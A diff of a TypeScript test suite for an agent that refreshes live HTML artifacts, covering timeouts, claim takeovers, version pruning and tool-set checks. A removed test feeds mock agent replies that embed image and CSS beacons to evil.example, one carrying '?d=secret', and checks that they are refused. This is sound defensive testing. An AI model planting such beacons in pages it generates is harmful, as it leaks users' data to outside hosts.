@@ -18,7 +18,7 @@ process.env.JWT_SECRET ??= `test-jwt-${rand(24)}`;
 process.env.SESSION_SECRET ??= `test-session-${rand(24)}`;
 process.env.LOG_LEVEL ??= 'error';
 
-type Step = { reply: string } | { fail: Error } | { wait: Promise<string> };
+type Step = { reply: string } | { fail: Error } | { wait: Promise<string> } | { real: true };
 const script = vi.hoisted(() => ({ steps: [] as Step[], calls: [] as RefreshRunInput[] }));
 vi.mock('./agent-refresh-runner', async (importOriginal) => {
   const actual = await importOriginal<typeof import('./agent-refresh-runner')>();
@@ -30,20 +30,28 @@ vi.mock('./agent-refresh-runner', async (importOriginal) => {
       if (!step) throw new Error('scripted runner: no step left');
       if ('fail' in step) throw step.fail;
       if ('wait' in step) return step.wait;
+      if ('real' in step) return actual.runRefreshAgent(input);
       return step.reply;
     },
   };
 });
 
 const policy = vi.hoisted(() => ({ retentionDays: 0, trashDays: 30 }));
-// The artifact host, switchable per test (subdomain mode when set).
-const hosting = vi.hoisted(() => ({ host: '' }));
 vi.mock('@/core/artifacts/settings', async (importOriginal) => {
   const actual = await importOriginal<typeof import('@/core/artifacts/settings')>();
+  return { ...actual, resolveArtifactRetention: () => ({ ...policy }) };
+});
+
+// The research role's tools as this server would resolve them (the real
+// runner checks them before it spawns): set per test.
+const roleTools = vi.hoisted(() => ({ names: null as null | string[] }));
+vi.mock('@/core/agent/roles', async (importOriginal) => {
+  const actual = await importOriginal<typeof import('@/core/agent/roles')>();
   return {
     ...actual,
-    resolveArtifactRetention: () => ({ ...policy }),
-    resolveArtifactSettings: () => ({ ...actual.resolveArtifactSettings(), host: hosting.host, proto: 'https' as const }),
+    getToolsForRole: (role: string) => roleTools.names
+      ? roleTools.names.map((name) => ({ name, toolId: name.split('__')[0], description: name, parameters: {}, execute: async () => null }))
+      : actual.getToolsForRole(role as Parameters<typeof actual.getToolsForRole>[0]),
   };
 });
 
@@ -76,6 +84,7 @@ const tokens: Record<string, string> = {};
 const PAGE = '```html\n<h1>Fresh</h1><button onclick="go()">go</button><script>function go(){ document.title = "y"; }</script>\n```\n```css\nh1 { color: red; }\n```';
 
 afterEach(() => {
+  roleTools.names = null;
   script.steps.length = 0;
   script.calls.length = 0;
   policy.retentionDays = 0;
@@ -166,7 +175,7 @@ describe('manual refresh by the owner', () => {
 
     // The run was the owner's, from the stored instruction only.
     expect(script.calls).toHaveLength(1);
-    expect(script.calls[0]).toMatchObject({ ownerUserId: alice, instruction: 'List this week\'s Rust releases', knowledgeAccess: false, trigger: 'user', workspaceId: a.workspaceId });
+    expect(script.calls[0]).toMatchObject({ ownerUserId: alice, instruction: 'List this week\'s Rust releases', trigger: 'user', workspaceId: a.workspaceId });
     expect(JSON.stringify(script.calls[0])).not.toContain('<p>old</p>');
   });
 
@@ -235,6 +244,27 @@ describe('manual refresh by the owner', () => {
       await deleteBudget(budget.id);
       _resetSpendBudgetsForTests();
     }
+  });
+});
+
+describe('a run that never ends', () => {
+  test('times out on schedule: the failure is recorded and its concurrency slot is freed', async () => {
+    const { startAgentRefresh } = await import('./agent-refresh');
+    const a = await seed('hung');
+    const b = await seed('after-hung');
+    script.steps.push({ wait: new Promise<string>(() => {}) }, { reply: PAGE });
+    const deps = { maxRuntimeMs: 100, maxConcurrent: 1 };
+    const started = await startAgentRefresh(a.id, 'user', deps);
+    expect(started.status).toBe('started');
+    if (started.status !== 'started') return;
+    const result = await started.done;
+    expect(result).toMatchObject({ outcome: 'failed' });
+    expect(result.error).toMatch(/took longer than/);
+    expect(await state(a.id)).toMatchObject({ running: false, lastOutcome: 'failed' });
+    // The slot is free again: a second refresh starts under a cap of one.
+    const next = await startAgentRefresh(b.id, 'user', deps);
+    expect(next.status).toBe('started');
+    if (next.status === 'started') expect((await next.done).outcome).toBe('success');
   });
 });
 
@@ -590,12 +620,37 @@ describe('versions', () => {
     expect((await artifactsRepository.getVersion((await current(a.id)).versionId!))?.htmlTemplate).toBe(`<p>page ${KEEP_REFRESH_VERSIONS + 2}</p>`);
   });
 
+  test('a version the owner restored is theirs: refresh pruning never removes it', async () => {
+    const a = await seed('restored-kept');
+    const { KEEP_REFRESH_VERSIONS } = await import('./agent-refresh');
+    script.steps.push({ reply: '```html\n<p>first refresh</p>\n```' });
+    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
+    await settled(a.id);
+    const refreshed = (await current(a.id)).versionId!;
+    // The owner restores the original, then the refreshed page.
+    expect((await call('POST', `/api/artifacts/${a.id}/versions/${a.versionId}/restore`)).status).toBe(200);
+    const restore = await call('POST', `/api/artifacts/${a.id}/versions/${refreshed}/restore`);
+    const restoredId = (await restore.json()).versionId as string;
+    for (let i = 0; i < KEEP_REFRESH_VERSIONS + 2; i++) {
+      script.steps.push({ reply: `\`\`\`html\n<p>later ${i}</p>\n\`\`\`` });
+      expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
+      for (let w = 0; w < 200 && (await state(a.id)).running; w++) await new Promise((r) => setTimeout(r, 20));
+    }
+    const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
+    const restored = await artifactsRepository.getVersion(restoredId);
+    expect(restored?.htmlTemplate).toBe('<p>first refresh</p>');
+    expect(restored?.schemaJson).toBe('{}');
+  });
+
   test('a version left by a run that crashed before making it current is removed by the next run', async () => {
     const a = await seed('crashed-version');
     const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
     const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
     const orphan = randomUUID();
-    await artifactRefreshRepository.setPendingVersion(a.id, orphan);
+    const { getDb } = await import('@/db/postgres');
+    const { artifactAgentRefresh } = await import('@/db/schema/artifact-agent-refresh');
+    const { eq } = await import('drizzle-orm');
+    await getDb().update(artifactAgentRefresh).set({ pendingVersionId: orphan }).where(eq(artifactAgentRefresh.artifactId, a.id));
     await artifactsRepository.createVersion({ id: orphan, artifactId: a.id, htmlTemplate: '<p>half</p>', changeSummary: 'agent refresh' });
     expect((await current(a.id)).versions).toBe(2);
     script.steps.push({ fail: new Error('nothing new') });
@@ -607,8 +662,73 @@ describe('versions', () => {
   });
 });
 
+describe('a claim taken over from a run still going', () => {
+  test('the old run cannot land a version the new run removed, and current never points at a missing version', async () => {
+    const a = await seed('takeover');
+    const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
+    const { getDb } = await import('@/db/postgres');
+    const { artifactAgentRefresh } = await import('@/db/schema/artifact-agent-refresh');
+    const { eq } = await import('drizzle-orm');
+    // Run A gets as far as its compare-and-set, its version inserted, and is held there.
+    let releaseA!: () => void;
+    const gate = new Promise<void>((r) => { releaseA = r; });
+    const original = artifactsRepository.setCurrentVersionIf.bind(artifactsRepository);
+    let reachedA = false;
+    const cas = vi.spyOn(artifactsRepository, 'setCurrentVersionIf').mockImplementationOnce(async (...args) => {
+      reachedA = true;
+      await gate;
+      return original(...args);
+    });
+    try {
+      script.steps.push({ reply: '```html\n<p>from A</p>\n```' });
+      expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
+      for (let i = 0; i < 200 && !reachedA; i++) await new Promise((r) => setTimeout(r, 10));
+      expect(reachedA).toBe(true);
+      const aVersion = (await (await import('@/db/repositories/artifact-refresh-repository')).artifactRefreshRepository.get(a.id))!.pendingVersionId!;
+      expect(await artifactsRepository.getVersion(aVersion)).not.toBeNull();
+
+      // A's claim goes stale; run B takes it over and removes A's pending version.
+      await getDb().update(artifactAgentRefresh).set({ runStartedAt: new Date(Date.now() - 60 * 60_000) }).where(eq(artifactAgentRefresh.artifactId, a.id));
+      let releaseB!: (s: string) => void;
+      script.steps.push({ wait: new Promise<string>((r) => { releaseB = r; }) });
+      expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
+      for (let i = 0; i < 200 && (await artifactsRepository.getVersion(aVersion)); i++) await new Promise((r) => setTimeout(r, 10));
+      expect(await artifactsRepository.getVersion(aVersion)).toBeNull();
+
+      // A resumes: its compare-and-set finds no row and fails.
+      releaseA();
+      await new Promise((r) => setTimeout(r, 200));
+      const mid = await current(a.id);
+      expect(mid.versionId).toBe(a.versionId);
+      expect(await artifactsRepository.getVersion(mid.versionId!)).not.toBeNull();
+
+      releaseB('```html\n<p>from B</p>\n```');
+      expect((await settled(a.id)).lastOutcome).toBe('success');
+      const end = await current(a.id);
+      expect((await artifactsRepository.getVersion(end.versionId!))?.htmlTemplate).toBe('<p>from B</p>');
+    } finally {
+      cas.mockRestore();
+    }
+  });
+
+  test('a run whose claim was taken over writes no version at all', async () => {
+    const a = await seed('takeover-early');
+    const { getDb } = await import('@/db/postgres');
+    const { artifactAgentRefresh } = await import('@/db/schema/artifact-agent-refresh');
+    const { eq } = await import('drizzle-orm');
+    let releaseA!: (s: string) => void;
+    script.steps.push({ wait: new Promise<string>((r) => { releaseA = r; }) });
+    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
+    // Another run's claim replaces A's while A is still working.
+    await getDb().update(artifactAgentRefresh).set({ runStartedAt: new Date(Date.now() - 1000) }).where(eq(artifactAgentRefresh.artifactId, a.id));
+    releaseA('```html\n<p>late A</p>\n```');
+    await new Promise((r) => setTimeout(r, 300));
+    expect(await current(a.id)).toEqual({ versionId: a.versionId, versions: 1 });
+  });
+});
+
 describe('the instruction and its tools', () => {
-  test('one stored by create_live_artifact is marked as the agent\'s, and the tool cannot schedule it or open knowledge', async () => {
+  test('one stored by create_live_artifact is marked as the agent\'s, and the tool cannot schedule it', async () => {
     const { ArtifactsTool } = await import('@/tools/artifacts');
     const tool = new ArtifactsTool();
     await tool.initialize();
@@ -623,28 +743,13 @@ describe('the instruction and its tools', () => {
     } as unknown as import('@/core/types').AgentContext;
     const made = await create.execute({
       slug: 'tool-made', title: 'Tool made', type: 'html', html_template: '<p>x</p>',
-      refresh_instruction: 'Weekly Rust news', refresh_interval_minutes: 60, knowledge_access: true,
+      refresh_instruction: 'Weekly Rust news', refresh_interval_minutes: 60,
     }, ctx) as { id: string };
     const s = await state(made.id);
-    expect(s).toMatchObject({ instruction: 'Weekly Rust news', instructionSetBy: 'agent', intervalMinutes: null, knowledgeAccess: false });
+    expect(s).toMatchObject({ instruction: 'Weekly Rust news', instructionSetBy: 'agent', intervalMinutes: null });
     // The owner saving it makes it theirs.
     const saved = await (await call('PUT', `/api/artifacts/${made.id}/agent-refresh`, { body: { instruction: 'Weekly Rust news' } })).json();
     expect(saved.refresh.instructionSetBy).toBe('owner');
-  });
-
-  test('knowledge access is the owner\'s opt-in and switches the run from the web to the knowledge base', async () => {
-    const a = await seed('knowledge');
-    expect((await state(a.id)).knowledgeAccess).toBe(false);
-    script.steps.push({ reply: PAGE });
-    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
-    await settled(a.id);
-    expect(script.calls[0]?.knowledgeAccess).toBe(false);
-    const res = await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { body: { knowledgeAccess: true } });
-    expect((await res.json()).refresh.knowledgeAccess).toBe(true);
-    script.steps.push({ reply: PAGE });
-    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
-    await settled(a.id);
-    expect(script.calls[1]?.knowledgeAccess).toBe(true);
   });
 
   test('PUT works without an instruction only to clear a schedule, and is refused in a shared space', async () => {
@@ -673,101 +778,12 @@ describe('the instruction and its tools', () => {
   });
 });
 
-describe('a knowledge-base page reaches no network', () => {
-  const ARTIFACT_HOST = 'artifacts.test';
-  /** The embed's CSP header and the <meta> copy, in path mode and on the artifact host. */
-  async function embedPolicies(slug: string): Promise<string[]> {
-    const out: string[] = [];
-    const path = await app.handle(new Request(`http://localhost/__artifacts__/a/${slug}/embed`, { headers: { authorization: `Bearer ${tokens[alice]}` } }));
-    expect(path.status).toBe(200);
-    out.push(path.headers.get('content-security-policy')!, /<meta http-equiv="Content-Security-Policy" content="([^"]*)"/.exec(await path.text())![1].replace(/&#39;/g, '\'').replace(/&quot;/g, '"'));
-    hosting.host = ARTIFACT_HOST;
-    try {
-      const sub = await app.handle(new Request(`http://localhost/a/${slug}/embed`, { headers: { host: ARTIFACT_HOST } }));
-      expect(sub.status).toBe(200);
-      out.push(sub.headers.get('content-security-policy')!, /<meta http-equiv="Content-Security-Policy" content="([^"]*)"/.exec(await sub.text())![1].replace(/&#39;/g, '\'').replace(/&quot;/g, '"'));
-    } finally {
-      hosting.host = '';
-    }
-    return out;
-  }
-  const strict = (csp: string) => {
-    expect(csp).not.toMatch(/https:|wss:|http:|\*/);
-    expect(csp).toContain('connect-src \'none\'');
-    expect(csp).toContain('img-src data: blob:');
-    expect(csp).toMatch(/default-src 'none'/);
-  };
-  const normal = (csp: string) => expect(csp).toContain('img-src \'self\' data: https:');
-
-  async function publicSeed(slug: string, knowledge: boolean) {
-    const a = await seed(slug);
-    expect((await call('PUT', `/api/artifacts/${a.id}`, { body: { visibility: 'public' } })).status).toBe(200);
-    if (knowledge) expect((await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { body: { knowledgeAccess: true } })).status).toBe(200);
-    return a;
-  }
-  async function refreshWith(id: string, reply: string) {
-    script.steps.push({ reply });
-    expect((await call('POST', `/api/artifacts/${id}/agent-refresh/run`)).status).toBe(202);
-    return settled(id);
-  }
-
-  test('its version gets the closed policy on every hosting path; turning knowledge off later does not loosen it', async () => {
-    const a = await publicSeed('kb-strict', true);
-    expect((await refreshWith(a.id, '```html\n<h1>From my notes</h1><img src="data:image/png;base64,AAAA">\n```')).lastOutcome).toBe('success');
-    const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
-    expect((await artifactsRepository.getVersion((await current(a.id)).versionId!))?.network).toBe('none');
-    const policies = await embedPolicies('kb-strict');
-    expect(policies).toHaveLength(4);
-    for (const csp of policies) strict(csp);
-    // No viewer token or SDK in a closed page.
-    const html = await (await app.handle(new Request('http://localhost/__artifacts__/a/kb-strict/embed', { headers: { authorization: `Bearer ${tokens[alice]}` } }))).text();
-    expect(html).not.toContain('octipus-artifact-token');
-    expect(html).not.toContain('octipus-artifact-client.js');
-
-    expect((await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { body: { knowledgeAccess: false } })).status).toBe(200);
-    for (const csp of await embedPolicies('kb-strict')) strict(csp);
-    // A restore of that version stays closed.
-    const kbVersion = (await current(a.id)).versionId!;
-    expect((await call('POST', `/api/artifacts/${a.id}/versions/${a.versionId}/restore`)).status).toBe(200);
-    for (const csp of await embedPolicies('kb-strict')) normal(csp);
-    expect((await call('POST', `/api/artifacts/${a.id}/versions/${kbVersion}/restore`)).status).toBe(200);
-    for (const csp of await embedPolicies('kb-strict')) strict(csp);
-    // A hand edit is the owner's page again: the normal policy.
-    expect((await call('PUT', `/api/artifacts/${a.id}`, { body: { htmlTemplate: '<p>by hand</p>' } })).status).toBe(200);
-    for (const csp of await embedPolicies('kb-strict')) normal(csp);
-  });
-
-  test('web-mode and hand-made versions keep the existing policy', async () => {
-    const a = await publicSeed('web-normal', false);
-    const before = await embedPolicies('web-normal');
-    for (const csp of before) normal(csp);
-    expect((await refreshWith(a.id, PAGE)).lastOutcome).toBe('success');
-    const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
-    expect((await artifactsRepository.getVersion((await current(a.id)).versionId!))?.network).toBe('default');
-    const after = await embedPolicies('web-normal');
-    for (const csp of after) normal(csp);
-    // Same policy apart from the bundle hash the refreshed page added.
-    const strip = (csp: string) => csp.replace(/'sha256-[^']+'/g, '').replace(/\s+/g, ' ');
-    expect(after.map(strip)).toEqual(before.map(strip));
-  });
-
-  test('a knowledge-base page with an external image or a script is refused, and the old version stays', async () => {
-    const a = await publicSeed('kb-refused', true);
-    const img = await refreshWith(a.id, '```html\n<h1>Notes</h1><img src="https://evil.example/p.gif?d=secret">\n```');
-    expect(img.lastOutcome).toBe('failed');
-    expect(img.lastError).toMatch(/self-contained page.*src="https:\/\/evil\.example\/p\.gif\?d=secret"/);
-    const css = await refreshWith(a.id, '```html\n<h1>Notes</h1>\n```\n```css\nbody { background: url(//evil.example/b.png); }\n```');
-    expect(css.lastError).toMatch(/url\(\/\/evil\.example\/b\.png\)/);
-    const js = await refreshWith(a.id, '```html\n<h1>Notes</h1><script>location = "/x";</script>\n```');
-    expect(js.lastError).toMatch(/without JavaScript/);
-    expect(await current(a.id)).toEqual({ versionId: a.versionId, versions: 1 });
-    for (const csp of await embedPolicies('kb-refused')) normal(csp);
-  });
-});
-
 describe('the real runner', () => {
-  async function runReal(slug: string, knowledgeAccess: boolean) {
-    const a = await seed(slug, 'Top 3 headlines');
+  const WEB = ['websearch__search', 'websearch__fetch_page'];
+
+  test('runs an unattended worker of the owner on exactly the two web tools, given only the stored instruction', async () => {
+    roleTools.names = [...WEB, 'knowledge__search_knowledge', 'filesystem__read_file', 'artifacts__update_live_artifact'];
+    const a = await seed('real-web', 'Top 3 headlines');
     const spawn = vi.fn(async () => '```html\n<p>new</p>\n```');
     worker.spawn = spawn;
     const actual = await vi.importActual<typeof import('./agent-refresh-runner')>('./agent-refresh-runner');
@@ -776,9 +792,8 @@ describe('the real runner', () => {
       artifactId: a.id,
       workspaceId: a.workspaceId,
       ownerUserId: alice,
-      title: slug,
+      title: 'real-web',
       instruction: 'Top 3 headlines',
-      knowledgeAccess,
       trigger: 'schedule',
       sessionId: null,
       signal: new AbortController().signal,
@@ -790,22 +805,26 @@ describe('the real runner', () => {
     const [role, task, input, parent, opts] = spawn.mock.calls[0] as unknown as [string, string, string, import('@/core/types').AgentContext, { toolIds: string[]; exactTools: boolean }];
     expect(role).toBe('research');
     expect(input).toBe('');
-    expect(task).toBe(actual.buildRefreshTask(slug, 'Top 3 headlines', knowledgeAccess));
+    expect(task).toBe(actual.buildRefreshTask('real-web', 'Top 3 headlines'));
     expect(task).not.toContain('<p>old</p>');
     expect(parent).toMatchObject({ userId: alice, sessionId: sessions[0], workspaceId: a.workspaceId, attended: false, trigger: 'schedule', funding: 'own' });
     expect(opts.exactTools).toBe(true);
-    return { actual, toolIds: opts.toolIds };
-  }
-
-  test('by default the run gets the web tools only: no knowledge base, no artifact tools', async () => {
-    const { actual, toolIds } = await runReal('real-web', false);
-    expect(toolIds).toEqual([...actual.REFRESH_WEB_TOOLS]);
-    expect(toolIds.some((t) => t.startsWith('knowledge') || t.startsWith('artifacts'))).toBe(false);
+    expect(opts.toolIds).toEqual(WEB);
   });
 
-  test('with knowledge access the run gets the knowledge tools only: no web tools', async () => {
-    const { actual, toolIds } = await runReal('real-knowledge', true);
-    expect(toolIds).toEqual([...actual.REFRESH_KNOWLEDGE_TOOLS]);
-    expect(toolIds.some((t) => t.startsWith('websearch') || t.startsWith('artifacts'))).toBe(false);
+  test('with web search unavailable the narrowing would fall open to the whole role, so the run is refused and nothing spawns', async () => {
+    // The research role's tools without websearch (the capability snapshot
+    // dropped it): narrowing matches nothing and returns all of these.
+    roleTools.names = ['knowledge__search_knowledge', 'knowledge__read_knowledge', 'filesystem__read_file', 'artifacts__update_live_artifact', 'mcp__call'];
+    const spawn = vi.fn(async () => '```html\n<p>leaked</p>\n```');
+    worker.spawn = spawn;
+    const a = await seed('no-websearch');
+    script.steps.push({ real: true });
+    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
+    const s = await settled(a.id);
+    expect(s.lastOutcome).toBe('refused');
+    expect(s.lastError).toMatch(/must have exactly websearch__search and websearch__fetch_page.*knowledge__search_knowledge/);
+    expect(spawn).not.toHaveBeenCalled();
+    expect(await current(a.id)).toEqual({ versionId: a.versionId, versions: 1 });
   });
 });
